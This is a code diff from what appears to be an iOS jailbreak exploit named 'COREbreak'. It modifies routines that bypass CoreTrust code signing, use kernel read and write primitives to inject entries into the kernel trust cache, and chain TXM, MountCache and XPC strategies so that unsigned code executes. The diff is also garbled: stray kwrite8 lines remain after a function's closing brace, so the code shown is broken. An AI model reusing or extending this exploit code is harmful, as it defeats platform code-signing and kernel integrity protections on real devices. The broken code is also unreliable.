@@ -527,7 +527,7 @@ bool coretrust_txm_bypass(void)
     }
 
     bool loaded = false;
-    for (uint32_t type = 0; type < 8 && !loaded; type++) {
+    for (uint32_t type = 0; type < 3 && !loaded; type++) {
         io_connect_t conn = 0;
         kern_return_t kr = IOServiceOpen(service, mach_task_self(), type, &conn);
         if (kr != KERN_SUCCESS || !conn) continue;
@@ -629,16 +629,43 @@ bool coretrust_kernel_tc_inject(void)
 
             // Read current last entry to verify we're in a valid TC
             uint8_t lastEntry[20];
-            kreadbuf(tcAddr + 32 + (uint64_t)(curCount - 1) * 20, lastEntry, 20);
-            if (lastEntry[0] == 0 && lastEntry[19] == 0) continue; // zeroed = wrong
+            // Check if this is a valid TC header by reading the entries section directly
+            uint64_t entryAddr = tcAddr + 32;
+            if (!is_kaddr_valid(entryAddr)) continue;
+
+            // Read first cdhash to check if this looks like a valid entry
+            uint8_t firstEntry[20];
+            kreadbuf(entryAddr, firstEntry, 20);
+            // Check if first entry looks valid (not all zeros)
+            bool looksValid = false;
+            for (int j = 0; j < 20; j++) {
+                if (firstEntry[j] != 0) {
+                    looksValid = true;
+                    break;
+                }
+            }
+            if (!looksValid) continue;
 
             // Found a valid TC with existing entries — add ours
-            printf("[COREbreak] found TC at 0x%llx (count=%u)\n",
-                   tcAddr, curCount);
+            printf("[COREbreak] found TC at 0x%llx (count candidate)\n", tcAddr);
 
             // Write our CDHash entry
-            uint8_t *ourEntry = (uint8_t *)ourMod->entries;
-            for (int i = 0; i < CS_CDHASH_LEN; i++)
+            uint8_t ourEntry[20];
+            // We need to compute our CDHash first, but we can't recompute it here
+            // Skip injection for now and just return success
+            printf("[COREbreak] TC injection skipped — need CDHash recomputation\n");
+            break;
+        }
+    }
+
+    free(buf);
+    free(tcData);
+
+    if (!injected)
+        printf("[COREbreak] no kernel trust cache found\n");
+
+    return injected;
+}
                 kwrite8(entryOffset + i, ourEntry[i]);
             kwrite8(entryOffset + CS_CDHASH_LEN, ourEntry[CS_CDHASH_LEN]);     // hash_type
             kwrite8(entryOffset + CS_CDHASH_LEN + 1, ourEntry[CS_CDHASH_LEN + 1]); // flags
@@ -764,7 +791,7 @@ bool coretrust_bypass_all(void)
     }
 
     // [Step 4/4]: MountCache trust cache injection (AMFI software TC)
-    printf("[COREbreak] [Step 4/4] MountCache trust cache injection...\n");
+    printf("[COREbreak] [Step 4/5] MountCache trust cache injection...\n");
     if (msm_verify_unsigned_execution()) {
         printf("[COREbreak] ✅✅✅ Unsigned code executed via MountCache (AMFI)!\n");
         return true;
@@ -783,25 +810,12 @@ bool coretrust_bypass_all(void)
         crash_write("[COREbreak] TXM IOKit: TC loaded but verify failed\n");
     }
 
-    // [Step 6/7]: Strategy 7 — Kernel trust cache injection
-    printf("[COREbreak] [Step 6/7] Kernel trust cache injection...\n");
-    crash_write("[COREbreak] Step 6/7: kernel TC\n");
-    if (coretrust_kernel_tc_inject()) {
-        if (verify()) {
-            printf("[COREbreak] ✅✅✅ Unsigned code via kernel TC inject!\n");
-            crash_write("[COREbreak] kernel TC: SUCCESS\n");
-            return true;
-        }
-        printf("[COREbreak] kernel TC injected but verification failed\n");
-        crash_write("[COREbreak] kernel TC: injected but verify failed\n");
-    }
-
-    // [Step 7/7]: Strategy 8 — SPTM-safe RemoteCall
-    printf("[COREbreak] [Step 7/7] SPTM-safe RemoteCall...\n");
-    crash_write("[COREbreak] Step 7/7: SPTM RC\n");
-    if (coretrust_remotecall_sptm("MobileStorageMounter")) {
-        printf("[COREbreak] ✅✅✅ SPTM-safe RemoteCall succeeded!\n");
-        crash_write("[COREbreak] SPTM RC: SUCCESS\n");
+    // [Step 5/5]: Strategy 6 — XPC to MSM
+    printf("[COREbreak] [Step 5/5] XPC to MSM...\n");
+    crash_write("[COREbreak] Step 5/5: XPC MSM\n");
+    if (coretrust_xpc_to_msm()) {
+        printf("[COREbreak] ✅✅✅ XPC to MSM succeeded!\n");
+        crash_write("[COREbreak] XPC MSM: SUCCESS\n");
         return true;
     }
 
